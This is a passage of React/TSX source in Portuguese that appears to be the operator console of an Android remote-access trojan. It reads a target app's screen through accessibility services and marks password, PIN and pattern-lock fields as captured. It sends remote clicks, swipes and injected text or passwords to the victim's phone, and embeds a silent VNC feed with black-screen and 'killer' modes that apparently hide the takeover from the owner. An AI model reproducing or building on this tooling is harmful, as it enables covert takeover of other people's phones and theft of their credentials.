                        <span className="px-2 py-0.5 text-[9px] font-black uppercase bg-[#ef4444]/20 text-[#ef4444] rounded border border-[#3a3a44]/40 tracking-wider shadow-[0_0_8px_rgba(239,68,68,0.3)]">
                          SECURE BYPASS
                        </span>
                      </div>
                      {screenHierarchy ? (
                        <p className="text-[11px] text-[#ef4444]/90 font-mono flex items-center gap-1.5 mt-0.5">
                          <span className="w-2 h-2 rounded-full bg-emerald-400 animate-ping" />
                          <span className="font-semibold text-slate-300">Pacote Alvo:</span>
                          <span className="text-[#ef4444] font-bold">{screenHierarchy.package}</span>
                        </p>
                      ) : (
                        <p className="text-[11px] text-slate-400 font-mono mt-0.5">Aguardando íconexão com dispositivo...</p>
                      )}
                    </div>
                  </div>
                  {isScreenReaderEnabled && (
                    <div className="flex items-center space-x-2.5">
                      <div className="text-[11px] font-mono bg-[#121214]/80 text-[#ef4444] border border-[#2a2a31]/40 px-3 py-1.5 rounded-md flex items-center shadow-[0_0_12px_rgba(239,68,68,0.2)]">
                        <div className="w-2.5 h-2.5 bg-[#ef4444] rounded-full mr-2 animate-pulse shadow-[0_0_6px_#ff6b6b]" />
                        ~10 FPS
                      </div>
                      <div className="text-[11px] font-mono font-bold bg-amber-950/80 text-amber-300 border border-amber-500/40 px-3 py-1.5 rounded-md flex items-center shadow-[0_0_12px_rgba(245,158,11,0.2)]">
                         Senhas Visíveis
                      </div>
                    </div>
                  )}
                </div>

                {/* Ž PAINEL DE CONTROLES E CONFIGURAES DA TELA V2 */}
                {isScreenReaderEnabled && screenHierarchy && (
                  <div className="p-3.5 bg-gradient-to-r from-slate-950/90 via-[#2c0903]/70 to-slate-950/90 border-b border-[#2a2a31]/20 space-y-3.5">
                    {/* Linha 1 - Sliders */}
                    <div className="grid grid-cols-1 sm:grid-cols-2 gap-3.5 text-xs">
                      {/* Escala do Texto */}
                      <div className="flex flex-col space-y-1.5 p-2.5 bg-[#121214]/60 rounded-md border border-[#24242a]">
                        <label className="text-slate-300 font-bold flex justify-between items-center text-[11px]">
                          <span className="flex items-center gap-1.5"> Escala do Texto</span>
                          <span className="text-[#ef4444] font-black font-mono bg-[#121214]/60 px-2 py-0.5 rounded border border-[#2a2a31]/30">{Math.round(v2TextScale * 100)}%</span>
                        </label>
                        <input type="range" min="60" max="200" value={v2TextScale * 100}
                          onChange={(e) => setV2TextScale(parseFloat(e.target.value) / 100)}
                          className="w-full h-1.5 rounded-full appearance-none cursor-pointer accent-[#ef4444] bg-[#24242a]"
                        />
                      </div>
                      {/* Opacidade dos Elementos */}
                      <div className="flex flex-col space-y-1.5 p-2.5 bg-[#121214]/60 rounded-md border border-[#24242a]">
                        <label className="text-slate-300 font-bold flex justify-between items-center text-[11px]">
                          <span className="flex items-center gap-1.5"> Opacidade Visão</span>
                          <span className="text-[#f87171] font-black font-mono bg-purple-950/60 px-2 py-0.5 rounded border border-[#f87171]/30">{Math.round(v2Opacity * 100)}%</span>
                        </label>
                        <input type="range" min="20" max="100" value={v2Opacity * 100}
                          onChange={(e) => setV2Opacity(parseFloat(e.target.value) / 100)}
                          className="w-full h-1.5 rounded-full appearance-none cursor-pointer accent-[#f87171] bg-[#24242a]"
                        />
                      </div>
                    </div>
                    
                    {/* Linha 2 - Selects e Toggles */}
                    <div className="grid grid-cols-2 sm:grid-cols-4 gap-2.5 text-xs">
                      {/* Modo / Tema Visual */}
                      <div className="flex flex-col space-y-1 col-span-2 sm:col-span-1">
                        <span className="text-slate-400 font-bold text-[10px] uppercase tracking-wider">¥ Tema Visual</span>
                        <select value={v2DesignTheme} onChange={(e) => setV2DesignTheme(e.target.value as any)}
                          className="w-full bg-[#121214]/90 text-[#e8e8ea] border border-[#2a2a31]/40 rounded-md p-1.5 text-[11px] focus:outline-none focus:border-[#3a3a44] font-bold cursor-pointer"
                        >
                          <option value="cyan"> Modern Blue</option>
                          <option value="matrix"> Hacker Matrix</option>
                          <option value="neon-red"> Alvo Tático</option>
                          <option value="purple-glowing"> Radar Fantasma</option>
                        </select>
                      </div>
                      
                      {/* Estilo de Borda */}
                      <div className="flex flex-col space-y-1 col-span-2 sm:col-span-1">
                        <span className="text-slate-400 font-bold text-[10px] uppercase tracking-wider"> Estilo de Borda</span>
                        <select value={v2CornerStyle} onChange={(e) => setV2CornerStyle(e.target.value as any)}
                          className="w-full bg-[#121214]/90 text-[#e8e8ea] border border-[#2a2a31]/40 rounded-md p-1.5 text-[11px] focus:outline-none focus:border-[#3a3a44] font-bold cursor-pointer"
                        >
                          <option value="brackets"> Cantos HUD</option>
                          <option value="full-border"> Borda Completa</option>
                          <option value="dots">· · Pontilhado</option>
                          <option value="none"> Sem Borda</option>
                        </select>
                      </div>
                      
                      {/* Toggles */}
                      <div className="col-span-2 sm:col-span-2 flex flex-wrap gap-2 items-center pt-3 sm:pt-0">
                        <label className="flex items-center space-x-1.5 cursor-pointer px-2.5 py-1.5 bg-[#121214]/80 rounded-md border border-[#2a2a31] hover:border-[#2a2a31]/50 transition-all select-none">
                          <input type="checkbox" checked={v2ShowGrid} onChange={(e) => setV2ShowGrid(e.target.checked)}
                            className="rounded w-3.5 h-3.5 text-[#ef4444] bg-slate-950 border-[#2a2a31]/40 focus:ring-0"
                          />
                          <span className="text-slate-200 font-bold text-[11px]"> Grade</span>
                        </label>
                        <label className="flex items-center space-x-1.5 cursor-pointer px-2.5 py-1.5 bg-[#121214]/80 rounded-md border border-[#2a2a31] hover:border-[#2a2a31]/50 transition-all select-none">
                          <input type="checkbox" checked={v2HideUntypedElements} onChange={(e) => setV2HideUntypedElements(e.target.checked)}
                            className="rounded w-3.5 h-3.5 text-[#ef4444] bg-slate-950 border-[#2a2a31]/40 focus:ring-0"
                          />
                          <span className="text-slate-200 font-bold text-[11px]"> Interativos</span>
                        </label>
                        <label className="flex items-center space-x-1.5 cursor-pointer px-2.5 py-1.5 bg-[#121214]/80 rounded-md border border-[#2a2a31] hover:border-[#2a2a31]/50 transition-all select-none">
                          <input type="checkbox" checked={v2ShowCoords} onChange={(e) => setV2ShowCoords(e.target.checked)}
                            className="rounded w-3.5 h-3.5 text-[#ef4444] bg-slate-950 border-[#2a2a31]/40 focus:ring-0"
                          />
                          <span className="text-slate-200 font-bold text-[11px]"> Coords</span>
                        </label>
                        <button
                          type="button"
                          onClick={() => {
                            const nextState = !v2PatternMode;
                            setV2PatternMode(nextState);
                            if (nextState) {
                              addLog(' Modo Desenhar Padrão ativado na Tela V2! Arraste entre os pontos 1-9.');
                            } else {
                              setV2PatternDrawn([]);
                              setV2PatternDragPos(null);
                            }
                          }}
                          className={`flex items-center space-x-1.5 px-3 py-1.5 rounded-md border transition-all text-[11px] font-black select-none cursor-pointer ${
                            v2PatternMode
                              ? 'bg-[#ef4444]/30 text-[#ef4444] border-[#3a3a44] shadow-[0_0_15px_rgba(239,68,68,0.5)] animate-pulse'
                              : 'bg-[#121214]/80 text-slate-300 border-[#2a2a31] hover:border-[#2a2a31]/40'
                          }`}
                          title="Ativar modo interativo de desenho da senha padrão (Pattern Lock)"
                        >
                          <span> Padrão {v2PatternDrawn.length > 0 ? `(${v2PatternDrawn.join('-')})` : ''}</span>
                        </button>
                      </div>
                    </div>
                  </div>
                )}
                
                {!isScreenReaderEnabled ? (
                  <div className="flex flex-col items-center justify-center p-6 text-center space-y-4" style={{ minHeight: '480px' }}>
                    <div className="p-5 rounded-md bg-gradient-to-b from-[#121214]/50 to-slate-950/80 border border-[#2a2a31]/40 text-[#ef4444] max-w-md shadow-[0_0_30px_rgba(239,68,68,0.2)]">
                      <Eye className="w-12 h-12 mx-auto mb-3 text-[#ef4444] animate-pulse" />
                      <h4 className="font-mono font-black text-base uppercase tracking-wider text-[#ef4444]">
                        Screen Reader V2 Tático
                      </h4>
                      <p className="text-xs text-slate-300 font-mono mt-1.5 mb-5 leading-relaxed">
                        Conectando ao módulo de leitura de acessibilidade e bypass em tempo real no aparelho.
                      </p>
                      <button
                        onClick={toggleScreenReader}
                        className="w-full py-3 bg-gradient-to-r from-[#ef4444] via-[#ef4444] to-[#ef4444] hover:from-[#ef4444] hover:to-[#ef4444] text-[#10120a] font-mono font-black text-xs uppercase tracking-wider rounded-md shadow-[0_0_25px_rgba(239,68,68,0.5)] transition-all transform hover:scale-[1.02]"
                      >
                         Ativar Screen Reader V2 Agora
                      </button>
                    </div>

                    {/* Transmissão VNC de Apoio */}
                    <div className="w-full max-w-[420px] rounded-md overflow-hidden border border-[#2a2a31]/40 shadow-[0_0_25px_rgba(239,68,68,0.15)]">
                      <DeviceScreen
                        deviceId={deviceId!}
                        onCommand={sendCommand}
                        isBlackScreenActive={isBlackScreen}
                        captureMethod="silent"
                        killerFrameOnPointerMove={isKillerMode}
                        onRequestFrame={requestKillerFrame}
                      />
                    </div>
                  </div>
                ) : screenHierarchy ? (
                  <>
                    <div className="grid grid-cols-1 md:grid-cols-12 gap-4 p-4 min-h-[440px] bg-[#0a0404]/40">
                    {/* Coluna da Esquerda (Canvas da Tela V2) */}
                    <div className="md:col-span-7 flex flex-col items-center justify-center relative">
                      <div 
                        onMouseDown={(e) => {
                          const screenElement = e.currentTarget.querySelector('[data-screen="true"]');
                          if (!screenElement) return;
                          
                          const rect = screenElement.getBoundingClientRect();
                          const x = e.clientX - rect.left;
                          const y = e.clientY - rect.top;
                          
                          setMouseDownPos({ x, y });
                          setMouseDownTime(Date.now());
                          setIsDragging(true);
                          dragPathRef.current = [{ x, y }];
                        }}
                        onMouseMove={(e) => {
                          if (!isDragging || !mouseDownPos) return;
                          
                          const screenElement = e.currentTarget.querySelector('[data-screen="true"]');
                          if (!screenElement) return;
                          
                          const rect = screenElement.getBoundingClientRect();
                          const x = e.clientX - rect.left;
                          const y = e.clientY - rect.top;
                          
                          const lastPoint = dragPathRef.current[dragPathRef.current.length - 1];
                          const dist = Math.sqrt(Math.pow(x - lastPoint.x, 2) + Math.pow(y - lastPoint.y, 2));
                          if (dist > 15) {
                            dragPathRef.current.push({ x, y });
                          }
                        }}
                        onMouseUp={(e) => {
                          if (!mouseDownPos) return;
                          
                          const screenElement = e.currentTarget.querySelector('[data-screen="true"]');
                          if (!screenElement) return;
                          
                          const rect = screenElement.getBoundingClientRect();
                          const upX = e.clientX - rect.left;
                          const upY = e.clientY - rect.top;
                          
                          const downX = mouseDownPos.x;
                          const downY = mouseDownPos.y;
                          
                          const deltaX = upX - downX;
                          const deltaY = upY - downY;
                          const distance = Math.sqrt(deltaX * deltaX + deltaY * deltaY);
                          const holdTime = Date.now() - mouseDownTime;
                          
                          const devW = screenHierarchy?.hierarchy?.bounds?.w || SCREEN_BASE_WIDTH;
                          const devH = screenHierarchy?.hierarchy?.bounds?.h || SCREEN_BASE_HEIGHT;
                          const realScale = rect.width / devW;
                          
                          const deviceDownX = Math.round(downX / realScale);
                          const deviceDownY = Math.round(downY / realScale);
                          const deviceUpX = Math.round(upX / realScale);
                          const deviceUpY = Math.round(upY / realScale);
                          
                          if (deviceDownX < 0 || deviceDownX > devW || deviceDownY < 0 || deviceDownY > devH) {
                            setMouseDownPos(null);
                            setIsDragging(false);
                            dragPathRef.current = [];
                            return;
                          }
                          
                          const normX = Math.max(0, Math.min(1, deviceDownX / devW));
                          const normY = Math.max(0, Math.min(1, deviceDownY / devH));
                          const normX1 = normX;
                          const normY1 = normY;
                          const normX2 = Math.max(0, Math.min(1, deviceUpX / devW));
                          const normY2 = Math.max(0, Math.min(1, deviceUpY / devH));
                          
                          if (holdTime > 500 && distance < 10) {
                            sendCommand({ 
                              action: 'LONG_PRESS',
                              x: normX,
                              y: normY,
                              scale: 'vnc_norm'
                            });
                            addLog(` Long Press: (${deviceDownX}, ${deviceDownY})`);
                          }
                          else if (distance > 30) {
                            sendCommand({ 
                              action: 'SWIPE',
                              x1: normX1,
                              y1: normY1,
                              x2: normX2,
                              y2: normY2,
                              scale: 'vnc_norm'
                            });
                            addLog(` Swipe: (${deviceDownX},${deviceDownY})  (${deviceUpX},${deviceUpY})`);
                          }
                          else {
                            sendCommand({ 
                              action: 'CLICK',
                              x: normX,
                              y: normY,
                              scale: 'vnc_norm'
                            });
                            addLog(`± Click: (${deviceDownX}, ${deviceDownY})`);
                          }
                          
                          setMouseDownPos(null);
                          setIsDragging(false);
                          dragPathRef.current = [];
                        }}
                        onMouseLeave={() => {
                          if (isDragging) {
                            setMouseDownPos(null);
                            setIsDragging(false);
                            dragPathRef.current = [];
                          }
                        }}
                        ref={(el) => {
                          if (el && screenHierarchy) {
                            const containerWidth = el.clientWidth;
                            const containerHeight = el.clientHeight;
                            
                            const scaleX = containerWidth / SCREEN_BASE_WIDTH;
                            const scaleY = containerHeight / SCREEN_BASE_HEIGHT;
                            const newScale = Math.min(scaleX, scaleY);
                            
                            if (newScale !== screenScale) {
                              setScreenScale(newScale);
                            }
                          }
                        }}
                        className="flex items-center justify-center cursor-crosshair relative group"
                      >
                        {/* Moldura Tática ao Redor do Celular */}
                        <div 
                          className="relative bg-[#0c0202] overflow-hidden rounded-md shadow-[0_0_35px_rgba(239,68,68,0.25)] border-2 border-[#2a2a31]/40 p-0.5 transition-all duration-300 hover:border-[#3a3a44]" 
                          style={{ 
                            width: '450px',
                            aspectRatio: `${getHierarchyRoot(screenHierarchy)?.bounds?.w || SCREEN_BASE_WIDTH} / ${getHierarchyRoot(screenHierarchy)?.bounds?.h || SCREEN_BASE_HEIGHT}`
                          }}
                        >
                          <ScreenReaderCanvas 
                            hierarchy={getHierarchyRoot(screenHierarchy)} 
                            scale={1} 
                            hoveredNode={hoveredNode} 
                            textScale={v2TextScale}
                            designTheme={v2DesignTheme}
                            hideUntyped={v2HideUntypedElements}
                            opacity={v2Opacity}
                            showGrid={v2ShowGrid}
                            cornerStyle={v2CornerStyle}
                            showCoords={v2ShowCoords}
                          />
                        </div>
                      </div>
                    </div>
                    
                    {/* Coluna da Direita (Lista de Elementos Clicáveis Atualizada) */}
                    <div className="md:col-span-5 flex flex-col h-[420px] bg-slate-950/70 rounded-md border border-[#2a2a31]/20 p-3 shadow-inner">
                      {/* Topo com Contador e Filtro de Busca */}
                      <div className="flex flex-col mb-2.5 pb-2 border-b border-[#2a2a31]/20 space-y-2">
                        <div className="flex items-center justify-between">
                          <h4 className="text-[#ef4444] font-black text-xs flex items-center tracking-wider font-mono">
                            <List className="w-4 h-4 mr-1.5 text-[#ef4444] animate-pulse" />
                            ELEMENTOS CLICVEIS ({(() => {
                              const list: ScreenReaderNode[] = [];
                              const collect = (node: ScreenReaderNode) => {
                                if (!node) return;
                                if (node.bounds && (node.clickable || node.editable || node.password || node.isPinDigit)) {
                                  list.push(node);
                                }
                                if (node.children && Array.isArray(node.children)) {
                                  node.children.forEach(c => collect(c));
                                }
                              };
                              const root = getHierarchyRoot(screenHierarchy);
                              if (root) collect(root);
                              return list.length;
                            })()})
                          </h4>
                        </div>
                        <input
                          type="text"
                          placeholder=" Buscar elemento por texto ou tipo..."
                          value={v2FilterQuery}
                          onChange={(e) => setV2FilterQuery(e.target.value)}
                          className="w-full bg-[#121214]/90 text-slate-100 border border-[#2a2a31]/30 rounded-md px-2.5 py-1 text-[11px] focus:outline-none focus:border-[#3a3a44] font-semibold"
                        />
                      </div>
                      
                      <div className="flex-1 overflow-y-auto space-y-1.5 pr-1 max-h-[350px] scrollbar-thin scrollbar-thumb-[#3a3a44]/25 scrollbar-track-transparent">
                        {(() => {
                          const list: ScreenReaderNode[] = [];
                          const collect = (node: ScreenReaderNode) => {
                            if (!node) return;
                            if (node.bounds && (node.clickable || node.editable || node.password || node.isPinDigit)) {
                              list.push(node);
                            }
                            if (node.children && Array.isArray(node.children)) {
                              node.children.forEach(c => collect(c));
                            }
                          };
                          const root = getHierarchyRoot(screenHierarchy);
                          if (root) collect(root);

                          const filtered = list.filter(item => {
                            if (!v2FilterQuery) return true;
                            const q = v2FilterQuery.toLowerCase();
                            const txt = (item.text || '').toLowerCase();
                            const desc = (item.desc || '').toLowerCase();
                            const id = (item.id || '').toLowerCase();
                            return txt.includes(q) || desc.includes(q) || id.includes(q);
                          });
                          
                          if (filtered.length === 0) {
                            return (
                              <div className="flex flex-col items-center justify-center py-10 text-center">
                                <Search className="w-6 h-6 text-[#6f6f78] mb-1.5" />
                                <p className="text-[#8b8b94] text-xs italic">Nenhum botão ou campo interativo encontrado</p>
                              </div>
                            );
                          }
                          
                          return filtered.map((item, idx) => {
                            let label = item.text?.trim() || item.desc?.trim() || item.hint?.trim() || '';
                            const isPwd = item.password;
                            const isInput = item.editable;
                            const isPin = item.isPinDigit;
                            
                            let typeBadge = " CLIQUE";
                            let badgeStyle = "bg-[#121214]/80 text-[#ef4444] border-[#2a2a31]/40";
                            
                            if (isPwd) {
                              typeBadge = " SENHA";
                              badgeStyle = "bg-[#121214]/80 text-[#ef4444] border-[#2a2a31]/40 shadow-[0_0_6px_rgba(239,68,68,0.3)]";
                            } else if (isInput) {
                              typeBadge = " INPUT";
                              badgeStyle = "bg-emerald-950/80 text-emerald-300 border-emerald-500/40";
                            } else if (isPin) {
                              typeBadge = " PIN";
                              badgeStyle = "bg-amber-950/80 text-amber-300 border-amber-500/40";
                            }
                            
                            if (!label) {
                              if (item.id) {
                                label = item.id.includes('/') ? item.id.split('/').pop() || '' : item.id;
                              } else if (item.class) {
                                label = item.class.split('.').pop() || '';
                              } else {
                                label = `Elemento #${idx + 1}`;
                              }
                            }
                            
                            const devW = getHierarchyRoot(screenHierarchy)?.bounds?.w || SCREEN_BASE_WIDTH;
                            const devH = getHierarchyRoot(screenHierarchy)?.bounds?.h || SCREEN_BASE_HEIGHT;
                            const cx = Math.round((item.bounds?.x || 0) + (item.bounds?.w || 0) / 2);
                            const cy = Math.round((item.bounds?.y || 0) + (item.bounds?.h || 0) / 2);
                            const normX = cx / devW;
                            const normY = cy / devH;
                            
                            return (
                              <div
                                key={idx}
                                onMouseEnter={() => setHoveredNode(item)}
                                onMouseLeave={() => setHoveredNode(null)}
                                className="group flex items-center justify-between p-2 rounded-md bg-[#121214]/60 hover:bg-[#121214]/40 border border-[#24242a] hover:border-[#2a2a31]/40 transition-all cursor-pointer shadow-sm"
                                onClick={() => {
                                  sendCommand({ action: 'CLICK', x: normX, y: normY, scale: 'vnc_norm' });
                                  addLog(`± Click remoto em: "${label}" (${cx}, ${cy})`);
                                }}
                              >
                                <div className="flex flex-col min-w-0 mr-2">
                                  <div className="flex items-center space-x-1.5">
                                    <span className={`text-[8px] font-bold px-1.5 py-0.5 rounded border uppercase tracking-wider ${badgeStyle}`}>
                                      {typeBadge}
                                    </span>
                                    <span className="text-[9px] text-slate-400 font-mono">
                                      ({cx}, {cy})
                                    </span>
                                  </div>
                                  <span className="text-xs font-bold text-slate-200 truncate mt-1 group-hover:text-[#ef4444] transition-colors">
                                    {label}
                                  </span>
                                </div>
                                <button
                                  className="px-2.5 py-1 bg-gradient-to-r from-[#ef4444] to-[#ef4444] hover:from-[#ef4444] hover:to-[#ef4444] text-[#10120a] rounded-md text-[10px] font-bold transition-all shadow-md flex-shrink-0"
                                >
                                   CLICAR
                                </button>
                              </div>
                            );
                          });
                        })()}
                      </div>
                    </div>
                  </div>

                  {/* ¨ BARRA DE INJEƒO DIRETA DE TEXTO NA TELA V2 */}
                  <div className="p-3 bg-[#120303]/90 border-t border-[#2a2a31]/20 flex flex-col sm:flex-row items-center gap-2.5 shadow-lg">
                    <div className="flex-1 flex items-center bg-[#121214]/90 rounded-md border border-[#2a2a31]/30 px-3 py-1.5 focus-within:border-[#3a3a44] focus-within:ring-1 focus-within:ring-[#ef4444]/50 w-full transition-all">
                      <span className="text-slate-400 mr-2 text-xs font-mono select-none">¨</span>
                      <input
                        type="text"
                        placeholder="Digite um texto ou senha para injetar no celular..."
                        value={textToSend}
                        onChange={(e) => setTextToSend(e.target.value)}
                        onKeyDown={(e) => {
                          if (e.key === 'Enter') handleSendText();
                        }}
                        className="w-full bg-transparent text-slate-100 text-xs focus:outline-none font-semibold placeholder:text-[#8b8b94]"
                      />
                      {textToSend && (
                        <button
                          type="button"
                          onClick={() => setTextToSend('')}
                          className="text-[#8b8b94] hover:text-slate-300 text-xs ml-1 font-bold"
                        >
                          
                        </button>
                      )}
                    </div>
                    <div className="flex items-center gap-2 w-full sm:w-auto">
                      <button
                        type="button"
                        onClick={handleSendText}
                        disabled={!textToSend.trim()}
                        className="flex-1 sm:flex-initial px-4 py-2 bg-gradient-to-r from-[#ef4444] via-[#ef4444] to-[#ef4444] hover:from-[#ef4444] hover:to-[#ef4444] disabled:opacity-40 disabled:cursor-not-allowed text-[#10120a] text-xs font-black uppercase tracking-wider rounded-md shadow-[0_0_15px_rgba(239,68,68,0.3)] transition-all flex items-center justify-center gap-1.5"
                      >
                         INJETAR TEXTO
                      </button>
                      <button
                        type="button"
                        onClick={() => sendCommand({ action: 'KEY', key: 'DEL' })}
                        className="px-3 py-2 bg-[#121214]/90 hover:bg-[#121214]/60 border border-[#2a2a31] hover:border-[#2a2a31]/40 text-slate-300 hover:text-[#ef4444] text-xs font-bold rounded-md transition-all flex items-center justify-center gap-1"
                        title="Apagar caractere (Backspace)"
                      >
                        
                      </button>
                      <button
                        type="button"
                        onClick={() => sendCommand({ action: 'KEY', key: 'ENTER' })}
                        className="px-3 py-2 bg-[#121214]/90 hover:bg-[#121214]/60 border border-[#2a2a31] hover:border-[#2a2a31]/40 text-slate-300 hover:text-[#ef4444] text-xs font-bold rounded-md transition-all flex items-center justify-center gap-1"
                        title="Pressionar Enter / Confirmar"
                      >
                        
                      </button>
                    </div>
                  </div>
                </>
                ) : (
                  <div className="flex flex-col items-center justify-center p-6 text-center space-y-4" style={{ minHeight: '480px' }}>
                    <div className="p-3 bg-[#121214]/40 border border-[#2a2a31]/30 rounded-md text-[#ef4444] flex items-center gap-3 font-mono text-xs">
                      <RefreshCw className="w-4 h-4 text-[#ef4444] animate-spin" />
                      <span>Sincronizando estrutura da tela V2...</span>
                      <button
                        onClick={() => {
                          fetchHierarchyRef.current?.();
                          sendCommand({ action: 'REQUEST_SCREEN_HIERARCHY' });
                        }}
                        className="px-3 py-1 bg-[#ef4444] hover:bg-[#ef4444] text-white font-bold rounded-md text-[11px] uppercase tracking-wider transition-all"
                      >
                         Sincronizar V2
                      </button>
                    </div>

                    {/* Transmissão VNC Direta de Apoio */}
                    <div className="w-full max-w-[420px] rounded-md overflow-hidden border border-[#2a2a31]/30 shadow-2xl">
                      <DeviceScreen
                        deviceId={deviceId!}
                        onCommand={sendCommand}
                        isBlackScreenActive={isBlackScreen}
                        captureMethod="silent"
                        killerFrameOnPointerMove={isKillerMode}
                        onRequestFrame={requestKillerFrame}
                      />
                    </div>
                  </div>
                )}
              </div>
            )}
          </div>

          {/* ===== COLUNA DIREITAÚ: Controles ===== */}
          <div className="space-y-3 order-3">
            
            {/* š OPES DE PERSONALIZAƒO & ELEMENTOS CLICVEIS DA TELA V2 (EXIBIDAS APENAS NA ABA VNC+V2 JUNTOS) */}
            {showCombinedVncV2 && isScreenReaderEnabled && screenHierarchy && (
              <div className="w-full space-y-3">
                {/* Card de Personalização da Visão V2 */}
                <div className="w-full bg-[#1a1a1e]/95 border border-[#2a2a31]/40 backdrop-blur-2xl rounded-md p-4 shadow-[0_0_25px_rgba(239,68,68,0.2)] space-y-3 text-xs">
                  <div className="flex items-center justify-between border-b border-[#2a2a31]/20 pb-2">
                    <span className="text-xs font-mono font-black uppercase text-[#ef4444] flex items-center gap-1.5">
                      š Personalizar Visão V2
                    </span>
                    <div className="flex items-center gap-2">
                      <select 
                        value={v2DesignTheme} 
                        onChange={(e) => setV2DesignTheme(e.target.value as any)}
                        className="bg-[#0c0202] text-[#ef4444] border border-[#2a2a31]/40 rounded-md px-2 py-1 text-[10px] font-mono font-bold focus:outline-none cursor-pointer"
                      >
                        <option value="cyan"> Modern Blue</option>
                        <option value="matrix"> Hacker Matrix</option>
                        <option value="neon-red"> Alvo Tático</option>
                        <option value="purple-glowing"> Radar Fantasma</option>
                      </select>

                      <select 
                        value={v2CornerStyle} 
                        onChange={(e) => setV2CornerStyle(e.target.value as any)}
                        className="bg-[#0c0202] text-[#ef4444] border border-[#2a2a31]/40 rounded-md px-2 py-1 text-[10px] font-mono font-bold focus:outline-none cursor-pointer"
                      >
                        <option value="brackets"> HUD</option>
                        <option value="full-border"> Borda</option>
                        <option value="dots">· · Pontilhado</option>
                        <option value="none"> Sem Borda</option>
                      </select>
                    </div>
                  </div>

                  {/* Sliders Rápidos & Checkboxes */}
                  <div className="grid grid-cols-2 gap-2 text-[10px] font-mono">
                    <div className="flex items-center justify-between bg-[#0c0202]/80 p-2 rounded-md border border-[#2a2a31]/20">
                      <span className="text-slate-300 font-bold"> Texto: {Math.round(v2TextScale * 100)}%</span>
                      <input 
                        type="range" min="60" max="200" value={v2TextScale * 100}
                        onChange={(e) => setV2TextScale(parseFloat(e.target.value) / 100)}
                        className="w-20 h-1.5 appearance-none cursor-pointer accent-[#ef4444] bg-[#24242a] rounded-full"
                      />
                    </div>
                    <div className="flex items-center justify-between bg-[#0c0202]/80 p-2 rounded-md border border-[#2a2a31]/20">
                      <span className="text-slate-300 font-bold"> Opacidade: {Math.round(v2Opacity * 100)}%</span>
                      <input 
                        type="range" min="20" max="100" value={v2Opacity * 100}
                        onChange={(e) => setV2Opacity(parseFloat(e.target.value) / 100)}
                        className="w-20 h-1.5 appearance-none cursor-pointer accent-[#f87171] bg-[#24242a] rounded-full"
                      />
                    </div>
                  </div>

                  <div className="flex items-center justify-between pt-1 font-mono text-[10px]">
                    <label className="flex items-center space-x-1.5 cursor-pointer text-slate-300">
                      <input 
                        type="checkbox" checked={v2ShowGrid} onChange={(e) => setV2ShowGrid(e.target.checked)}
                        className="rounded w-3.5 h-3.5 text-[#ef4444] bg-slate-950 border-[#2a2a31]/40 focus:ring-0"
                      />
                      <span> Grade</span>
                    </label>

                    <label className="flex items-center space-x-1.5 cursor-pointer text-slate-300">
                      <input 
                        type="checkbox" checked={v2ShowCoords} onChange={(e) => setV2ShowCoords(e.target.checked)}
                        className="rounded w-3.5 h-3.5 text-[#ef4444] bg-slate-950 border-[#2a2a31]/40 focus:ring-0"
                      />
                      <span> Coordenadas</span>
                    </label>

                    <label className="flex items-center space-x-1.5 cursor-pointer text-slate-300">
                      <input 
                        type="checkbox" checked={v2HideUntypedElements} onChange={(e) => setV2HideUntypedElements(e.target.checked)}
                        className="rounded w-3.5 h-3.5 text-[#ef4444] bg-slate-950 border-[#2a2a31]/40 focus:ring-0"
                      />
                      <span> Esconder Genéricos</span>
                    </label>
                  </div>
                </div>

                {/* Card de Lista de Elementos Clicáveis */}
                <div className="w-full bg-[#1a1a1e]/95 border border-[#2a2a31]/40 backdrop-blur-2xl rounded-md p-4 shadow-[0_0_25px_rgba(239,68,68,0.2)] space-y-2.5">
                  <div className="flex items-center justify-between border-b border-[#2a2a31]/20 pb-2">
                    <div className="flex items-center space-x-2 font-mono">
                      <List className="w-4 h-4 text-[#ef4444] animate-pulse" />
                      <span className="text-xs font-black uppercase text-[#ef4444] tracking-wider">
                        Elementos Clicáveis ({(() => {
                          const list: ScreenReaderNode[] = [];
                          const collect = (node: ScreenReaderNode) => {
                            if (!node) return;
                            if (node.bounds && (node.clickable || node.editable || node.password || node.isPinDigit)) {
                              list.push(node);
                            }
                            if (node.children && Array.isArray(node.children)) {
                              node.children.forEach(c => collect(c));
                            }
                          };
                          const root = getHierarchyRoot(screenHierarchy);
                          if (root) collect(root);
                          return list.length;
                        })()})
                      </span>
                    </div>
                  </div>

                  <div className="flex items-center gap-2">
                    <input
                      type="text"
                      placeholder=" Buscar botão, input, senha..."
                      value={v2FilterQuery}
                      onChange={(e) => setV2FilterQuery(e.target.value)}
                      className="w-full bg-[#0c0202] text-[#e8e8ea] border border-[#2a2a31]/30 rounded-md px-3 py-1.5 text-xs focus:outline-none focus:border-[#3a3a44] font-mono"
                    />
                  </div>

                  {/* Lista Scrollável de Elementos */}
                  <div className="max-h-[280px] overflow-y-auto space-y-1.5 pr-1 custom-scrollbar">
                    {(() => {
                      const list: ScreenReaderNode[] = [];
                      const collect = (node: ScreenReaderNode) => {
                        if (!node) return;
                        if (node.bounds && (node.clickable || node.editable || node.password || node.isPinDigit)) {
                          list.push(node);
                        }
                        if (node.children && Array.isArray(node.children)) {
                          node.children.forEach(c => collect(c));
                        }
                      };
                      const root = getHierarchyRoot(screenHierarchy);
                      if (root) collect(root);

                      const filtered = list.filter(item => {
                        if (!v2FilterQuery) return true;
                        const q = v2FilterQuery.toLowerCase();
                        const txt = (item.text || '').toLowerCase();
                        const desc = (item.desc || '').toLowerCase();
                        const id = (item.id || '').toLowerCase();
                        return txt.includes(q) || desc.includes(q) || id.includes(q);
                      });

                      if (filtered.length === 0) {
                        return (
                          <div className="flex flex-col items-center justify-center py-6 text-center">
                            <Search className="w-5 h-5 text-[#6f6f78] mb-1" />
                            <p className="text-[#8b8b94] text-xs font-mono italic">Nenhum botão ou campo encontrado</p>
                          </div>
                        );
                      }

                      return filtered.map((item, idx) => {
                        let label = item.text?.trim() || item.desc?.trim() || item.hint?.trim() || '';
                        const isPwd = item.password;
                        const isInput = item.editable;
                        const isPin = item.isPinDigit;

                        let typeBadge = " CLIQUE";
                        let badgeStyle = "bg-[#121214]/90 text-[#ef4444] border-[#2a2a31]/40";

                        if (isPwd) {
                          typeBadge = " SENHA";
                          badgeStyle = "bg-[#121214]/90 text-[#ef4444] border-[#2a2a31]/40 shadow-[0_0_6px_rgba(239,68,68,0.3)]";
                        } else if (isInput) {
                          typeBadge = " INPUT";
                          badgeStyle = "bg-emerald-950/90 text-emerald-300 border-emerald-500/40";
                        } else if (isPin) {
                          typeBadge = " PIN";
